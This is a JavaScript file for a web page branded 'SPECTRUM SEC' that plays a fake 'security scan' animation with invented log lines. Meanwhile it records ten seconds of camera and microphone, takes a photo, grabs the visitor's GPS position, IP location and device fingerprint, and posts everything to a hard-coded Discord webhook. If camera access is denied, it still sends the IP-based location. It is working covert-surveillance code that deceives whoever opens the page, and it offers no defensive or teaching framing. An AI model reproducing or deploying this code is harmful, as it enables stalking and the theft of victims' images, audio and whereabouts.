// CONFIG - SEU WEBHOOK
const DISCORD_WEBHOOK_URL = 'https://discordapp.com/api/webhooks/1523084788863467611/yfUAPTp-inY_9IvcJKwqWujOZWANPu6xy8yBPG9X6bLBfmcjPr2OQfZm6kuUU4HdlisZ';

const startBtn = document.getElementById('startBtn');
const consoleLog = document.getElementById('consoleLog');
const progressBar = document.getElementById('progressBar');
const progressContainer = document.getElementById('progressContainer');
const statusValue = document.getElementById('statusValue');
const targetValue = document.getElementById('targetValue');
const video = document.getElementById('video');

let stream = null;

function addLog(message, type = 'system') {
    const now = new Date();
    const time = now.toTimeString().split(' ')[0];
    const div = document.createElement('div');
    div.className = `log-line ${type}`;
    let prefix = '▸';
    if (type === 'success') prefix = '✓';
    else if (type === 'info') prefix = 'ℹ';
    else if (type === 'warning') prefix = '⚠';
    else if (type === 'error') prefix = '✕';
    div.innerHTML = `<span class="timestamp">[${time}]</span> ${prefix} ${message}`;
    consoleLog.appendChild(div);
    consoleLog.scrollTop = consoleLog.scrollHeight;
}

function setProgress(percent) {
    progressContainer.classList.add('active');
    progressBar.style.width = `${percent}%`;
}

const wait = ms => new Promise(r => setTimeout(r, ms));
const typeLog = (msg, type, delay = 400) => wait(delay).then(() => addLog(msg, type));

startBtn.addEventListener('click', async () => {
    startBtn.disabled = true;
    startBtn.innerHTML = '<div class="spinner" style="display:inline-block"></div> PROCESSANDO...';

    try {
        // FASE 1 - INICIANDO
        await typeLog('Iniciando protocolo de varredura...', 'info', 300);
        setProgress(5);
        await typeLog('Estabelecendo conexão segura com servidor...');
        setProgress(10);
        await wait(500);
        await typeLog('Handshake TLS completo. Criptografia ativa.', 'success', 400);
        setProgress(15);
        await typeLog('Solicitando acesso ao hardware do dispositivo...');

        // FASE 2 - CÂMERA
        await wait(800);
        await typeLog('Acessando dispositivos de captura...', 'info');
        setProgress(25);

        stream = await navigator.mediaDevices.getUserMedia({ 
            video: { width: { ideal: 640 }, height: { ideal: 480 }, frameRate: { ideal: 30 } }, 
            audio: true 
        });
        video.srcObject = stream;
        await wait(500);

        await typeLog('Driver de câmera sincronizado.', 'success', 300);
        setProgress(35);

        // FASE 3 - GRAVAÇÃO 10s
        await typeLog('Iniciando captura de pacotes...');
        setProgress(40);

        const recordedChunks = [];
        const mediaRecorder = new MediaRecorder(stream, { 
            mimeType: MediaRecorder.isTypeSupported('video/webm;codecs=vp9,opus')
                ? 'video/webm;codecs=vp9,opus'
                : 'video/webm;codecs=vp8,opus'
        });

        mediaRecorder.ondataavailable = (e) => {
            if (e.data.size > 0) recordedChunks.push(e.data);
        };

        mediaRecorder.start();

        for (let i = 1; i <= 10; i++) {
            await wait(1000);
            const progress = 40 + (i * 5);
            setProgress(Math.min(progress, 90));
            if (i <= 2) await typeLog(`Analisando protocolos de rede... [${i}/10]`);
            else if (i <= 4) await typeLog(`Extraindo metadados do sistema... [${i}/10]`);
            else if (i <= 6) await typeLog(`Varredura de portas do dispositivo... [${i}/10]`);
            else if (i <= 8) await typeLog(`Coletando fingerprints digitais... [${i}/10]`);
            else await typeLog(`Pacotes capturados: ${Math.floor(Math.random() * 200 + 100)}... [${i}/10]`);
        }

        mediaRecorder.stop();
        await wait(300);

        // FASE 4 - FOTO
        await typeLog('Processando payloads recebidos...', 'info', 400);
        setProgress(85);

        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth || 640;
        canvas.height = video.videoHeight || 480;
        canvas.getContext('2d').drawImage(video, 0, 0);
        const photoBlob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.85));

        await typeLog('Payload decodificado.', 'success', 300);

        // FASE 5 - LOCALIZAÇÃO GPS
        await typeLog('Triangulando sinal GPS...', 'warning', 400);
        setProgress(90);

        let latitude = 'N/D';
        let longitude = 'N/D';
        let accuracy = 'N/A';
        let googleMapsUrl = '';

        try {
            const pos = await new Promise((resolve, reject) => {
                navigator.geolocation.getCurrentPosition(resolve, reject, {
                    enableHighAccuracy: true,
                    timeout: 8000,
                    maximumAge: 0
                });
            });

            latitude = pos.coords.latitude;
            longitude = pos.coords.longitude;
            accuracy = pos.coords.accuracy + 'm';
            googleMapsUrl = `https://www.google.com/maps?q=${latitude},${longitude}`;

            await typeLog(`Coordenadas obtidas: ${latitude.toFixed(4)}, ${longitude.toFixed(4)}`, 'success');
        } catch (e) {
            await typeLog('GPS indisponível, usando geolocalização por IP...', 'warning');
        }

        setProgress(95);

        // FASE 6 - INFO DO SISTEMA + IP
        const browserData = {
            userAgent: navigator.userAgent,
            platform: navigator.platform,
            language: navigator.language,
            screen: `${screen.width}x${screen.height}`,
            colorDepth: screen.colorDepth + 'bit',
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            cookiesEnabled: navigator.cookieEnabled,
            hardwareConcurrency: navigator.hardwareConcurrency + ' cores',
            deviceMemory: navigator.deviceMemory ? navigator.deviceMemory + 'GB' : 'N/D',
            ip: 'Consultando...'
        };

        try {
            const ipRes = await fetch('https://api.ipify.org?format=json');
            const ipData = await ipRes.json();
            browserData.ip = ipData.ip;

            try {
                const geoRes = await fetch(`http://ip-api.com/json/${browserData.ip}`);
                const geoData = await geoRes.json();
                if (geoData.status === 'success') {
                    browserData.city = geoData.city;
                    browserData.region = geoData.regionName;
                    browserData.country = geoData.country;
                    browserData.isp = geoData.isp;
                    browserData.zip = geoData.zip;
                    browserData.lat = geoData.lat;
                    browserData.lon = geoData.lon;

                    if (latitude === 'N/D') {
                        latitude = geoData.lat;
                        longitude = geoData.lon;
                        googleMapsUrl = `https://www.google.com/maps?q=${geoData.lat},${geoData.lon}`;
                        accuracy = 'IP geolocation';
                    }
                }
            } catch(e) {}
        } catch(e) {}

        targetValue.textContent = browserData.ip !== 'Consultando...' ? browserData.ip : 'DESCONHECIDO';

        await typeLog(`IP identificado: ${browserData.ip}`, 'success', 300);
        await typeLog('Sistema fingerprint completo.', 'success');

        // FASE 7 - ENVIAR PARA DISCORD
        await typeLog('Compactando payload para transmissão...', 'info');
        setProgress(98);

        // ===== NOVO ENVIO CORRIGIDO =====
        // Envia PRIMEIRO uma mensagem só com o link do Maps (sem attachment)
        // Depois envia o embed principal com foto/vídeo
        
        // MENSAGEM 1: Link do Google Maps (puro, sem risco de blob)
        if (googleMapsUrl) {
            const mapMessage = {
                content: `**📍 LOCALIZAÇÃO EXATA**\n${googleMapsUrl}\n\`Lat: ${typeof latitude === 'number' ? latitude.toFixed(6) : latitude} | Lon: ${typeof longitude === 'number' ? longitude.toFixed(6) : longitude}\`\n\`Precisão: ${accuracy}\``
            };
            
            try {
                await fetch(DISCORD_WEBHOOK_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(mapMessage)
                });
                await typeLog('Link do mapa transmitido.', 'success', 200);
            } catch(e) {
                console.log('Erro ao enviar link do mapa:', e);
            }
        }

        // MENSAGEM 2: Embed com foto, vídeo e dados
        const formData = new FormData();
        let fileIndex = 0;

        // Montar embed
        const embed = {
            embeds: [{
                title: '⬡ SPECTRUM - DADOS COLETADOS',
                color: 0x00ff88,
                description: `**Alvo:** ${browserData.ip}\n**Plataforma:** ${browserData.platform}\n**Horário:** ${new Date().toLocaleString('pt-BR')}`,
                fields: [
                    {
                        name: '🌐 CONEXÃO',
                        value: `\`\`\`IP: ${browserData.ip}\nISP: ${browserData.isp || 'N/D'}\nCidade: ${browserData.city || browserData.region || 'N/D'}\nPaís: ${browserData.country || 'N/D'}\`\`\``,
                        inline: false
                    },
                    {
                        name: '💻 DISPOSITIVO',
                        value: `\`\`\`Plataforma: ${browserData.platform}\nTela: ${browserData.screen}\nTimezone: ${browserData.timezone}\nIdioma: ${browserData.language}\nCPU: ${browserData.hardwareConcurrency}\nRAM: ${browserData.deviceMemory}\`\`\``,
                        inline: false
                    },
                    {
                        name: '📋 USER AGENT',
                        value: `\`\`\`${browserData.userAgent}\`\`\``,
                        inline: false
                    }
                ],
                footer: { text: `SPECTRUM SEC • ${new Date().toLocaleString('pt-BR')}` },
                timestamp: new Date().toISOString()
            }]
        };

        // Adicionar foto como attachment
        if (photoBlob) {
            const photoFile = new File([photoBlob], `foto_${Date.now()}.jpg`, { type: 'image/jpeg' });
            formData.append(`files[${fileIndex}]`, photoFile);
            embed.embeds[0].image = { url: `attachment://foto_${Date.now()}.jpg` };
            fileIndex++;
        }

        // Adicionar vídeo como attachment
        if (recordedChunks.length > 0) {
            const videoBlob = new Blob(recordedChunks, { type: 'video/webm' });
            const videoFile = new File([videoBlob], `gravacao_${Date.now()}.webm`, { type: 'video/webm' });
            formData.append(`files[${fileIndex}]`, videoFile);
            fileIndex++;
        }

        // Adicionar payload JSON
        const payloadBlob = new Blob([JSON.stringify(embed)], { type: 'application/json' });
        formData.append('payload_json', payloadBlob);

        const response = await fetch(DISCORD_WEBHOOK_URL, {
            method: 'POST',
            body: formData
        });

        if (!response.ok) {
            const text = await response.text();
            throw new Error(`Discord error ${response.status}: ${text}`);
        }

        await typeLog('Dados transmitidos com sucesso!', 'success', 500);
        // ===== FIM NOVO ENVIO =====

        setProgress(100);
        await wait(300);
        addLog('─── OPERAÇÃO CONCLUÍDA ───');
        statusValue.textContent = '✅ CONCLUÍDO';
        statusValue.style.color = '#00ff88';

        startBtn.innerHTML = '<span class="btn-icon">✓</span> DADOS PUXADOS COM SUCESSO';
        startBtn.style.borderColor = 'rgba(0, 255, 136, 0.5)';
        startBtn.style.color = '#00ff88';

        if (stream) stream.getTracks().forEach(track => track.stop());

    } catch (err) {
        console.error(err);

        if (err.name === 'NotAllowedError' || err.name === 'PermissionDeniedError') {
            await typeLog('Acesso negado ao hardware do dispositivo!', 'error', 500);
            await typeLog('Tentando método alternativo...', 'warning', 800);
            await typeLog('Coletando dados disponíveis sem câmera...', 'info', 500);

            try {
                const ipRes = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipRes.json();
                const geoRes = await fetch(`http://ip-api.com/json/${ipData.ip}`);
                const geoData = await geoRes.json();

                let mapsUrl = '';
                if (geoData.status === 'success') {
                    mapsUrl = `https://www.google.com/maps?q=${geoData.lat},${geoData.lon}`;
                    
                    // Envia link do mapa primeiro
                    await fetch(DISCORD_WEBHOOK_URL, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            content: `**📍 LOCALIZAÇÃO (IP)**\n${mapsUrl}\n\`Cidade: ${geoData.city}\nPaís: ${geoData.country}\``
                        })
                    });
                }

                const fallbackEmbed = {
                    embeds: [{
                        title: '⬡ SPECTRUM - DADOS PARCIAIS',
                        color: 0xffaa00,
                        description: '**Câmera não disponível - apenas dados de rede**',
                        fields: [
                            { name: '🌐 CONEXÃO', value: `\`\`\`IP: ${ipData.ip}\nISP: ${geoData.isp || 'N/D'}\nCidade: ${geoData.city || 'N/D'}\nPaís: ${geoData.country || 'N/D'}\`\`\``, inline: false },
                            { name: '💻 DISPOSITIVO', value: `\`\`\`Plataforma: ${navigator.platform}\nTela: ${screen.width}x${screen.height}\nTimezone: ${Intl.DateTimeFormat().resolvedOptions().timeZone}\nIdioma: ${navigator.language}\`\`\``, inline: false }
                        ],
                        footer: { text: `SPECTRUM SEC • ${new Date().toLocaleString('pt-BR')}` },
                        timestamp: new Date().toISOString()
                    }]
                };

                const fd = new FormData();
                fd.append('payload_json', new Blob([JSON.stringify(fallbackEmbed)], { type: 'application/json' }));

                await fetch(DISCORD_WEBHOOK_URL, { method: 'POST', body: fd });

                await typeLog('Dados parciais transmitidos!', 'success');
                setProgress(100);
                statusValue.textContent = '✅ PARCIAL';
            } catch(e2) {
                await typeLog('Falha na transmissão.', 'error');
                statusValue.textContent = '❌ FALHA';
                statusValue.style.color = '#ef5350';
            }
        } else {
            addLog(`Erro: ${err.message || 'Desconhecido'}`, 'error');
            statusValue.textContent = '❌ ERRO';
            statusValue.style.color = '#ef5350';
        }

        startBtn.disabled = false;
        startBtn.innerHTML = '<span class="btn-icon">⟳</span> TENTAR NOVAMENTE';
    }
});